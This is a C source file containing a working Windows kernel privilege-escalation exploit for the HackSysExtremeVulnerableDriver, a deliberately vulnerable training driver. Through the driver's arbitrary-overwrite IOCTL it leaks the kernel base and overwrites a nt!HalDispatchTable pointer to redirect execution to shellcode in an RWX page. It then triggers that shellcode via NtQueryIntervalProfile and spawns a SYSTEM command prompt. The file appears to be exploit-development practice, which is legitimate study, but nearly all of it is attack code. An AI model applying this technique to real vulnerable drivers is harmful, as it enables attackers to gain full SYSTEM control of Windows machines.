#include <windows.h>
#include <winioctl.h>
#include <Winternl.h>
#include <stdio.h>
#include <stdint.h>

#include "../KePwnLib.h"

#define DRIVER_PATH "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL_HEVD_ARBITRARY_OVERWRITE 0x22200b


/**
 * refs:
 * https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/profile/queryinterval.htm
 */

typedef NTSTATUS (__stdcall *_NtQueryIntervalProfile)(ULONG ProfileSource, PULONG Interval);

#pragma comment(lib,"ntdll.lib")


HANDLE hDevice = INVALID_HANDLE_VALUE;


BOOL  WriteMemory(ULONG_PTR what, ULONG_PTR where)
{
        BOOL bResult = FALSE;
        DWORD lpBytesReturned = 0;
        ULONG_PTR lpInBuffer[2] = {
                what,
                where
        };

        ok("Overwriting %p with %p\n", lpInBuffer[0], lpInBuffer[1]);

        info("Sending IOCTL request...\n");
        bResult = DeviceIoControl(hDevice,
                                  IOCTL_HEVD_ARBITRARY_OVERWRITE,
                                  lpInBuffer,
                                  0x10,
                                  NULL,
                                  0,
                                  &lpBytesReturned,
                                  NULL);
        if (bResult==FALSE){
                perr("DeviceIoControl failed");
        }

        return bResult;
}


BOOL HevdIoControl()
{
        ULONG_PTR lpShellcode;
        DWORD dwOffset;
        ULONG_PTR pKernelBase;

        /* 1. Get a Handle to the device */
        info("Getting handle for device '%s' with code %#x\n", DRIVER_PATH, IOCTL_HEVD_ARBITRARY_OVERWRITE);

        hDevice = CreateFileA(DRIVER_PATH, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
        if (hDevice == INVALID_HANDLE_VALUE){
                perr("CreateFileA failed");
                return FALSE;
        }
        ok("Got device handle %#x\n", hDevice);


        /* 2. Allocate a RWX page and drop the payload in there */
        info("Preparing payload\n");
        lpShellcode = AllocatePageWithShellcode();
        if (!lpShellcode){
                perr("AllocatePageWithShellcode() failed");
                goto CloseDevice_loc;
        }
        ok("Placed shellcode at %p\n", lpShellcode);


        /* 3.a Leak the kernel image base using NtQuerySystemInformation(SystemModuleInformation)... */
        info("Retrieving kernel base...\n");
        pKernelBase = GetKernelImageBase();
        if (!pKernelBase){
                err("Failed to get Kernel image base\n");
                return FALSE;
        }

        /* 3.b and the offset of nt!HalDispatchTable from userland */
        HMODULE hNtosMod = LoadLibrary(KERNEL_PROCESS_NAME);
        ok("ntoskrnl base = %x\n", hNtosMod);
        ULONG lNtHalDispatchTableOffset = (ULONG)GetProcAddress(hNtosMod, "HalDispatchTable") - (ULONG)hNtosMod;
        ok("HalDispatchTable offset = %x\n", lNtHalDispatchTableOffset);
        ULONG_PTR nt_HalDispatchTable = pKernelBase + lNtHalDispatchTableOffset + 8;
        ok("KeHalDispatchTable = %p\n", nt_HalDispatchTable);

        ULONG_PTR tramp[1] = {
                ((ULONG_PTR)(&lpShellcode) ),
        };

        /* 4. Overwrite nt!HalDispatchTable[1] pointer 2 DWORD */
        WriteMemory(tramp[0], nt_HalDispatchTable);
        WriteMemory(tramp[0]+4, nt_HalDispatchTable+4);

        /* 5. Calling nt!NtQueryIntervalProfile() to force calling the overwritten HalDispatchTable pointer */
        _NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")),
                                                                                                 "NtQueryIntervalProfile");
        ok("Got NtQueryIntervalProfile() at %p, calling it...\n", NtQueryIntervalProfile);

        ULONG uProfileSource, uInterval;
        uProfileSource = 2;
        NtQueryIntervalProfile(uProfileSource, &uInterval);


CloseDevice_loc:
        info("Closing device %#lx\n", hDevice);
        CloseHandle(hDevice);

        return TRUE;
}


int main(int argc, char** argv, char** envp)
{
        info("Starting exploit for ArbitraryOverwrite...\n");

        if (HevdIoControl()==TRUE){
                info("Checking if %s is SYSTEM\n", argv[0]);
                if (CheckIsSystem()==TRUE){
                        ok("Success\n");
                        PopupCmd();
                } else {
                        warn("Not SYSTEM\n");
                }
        }

        return 0;
}
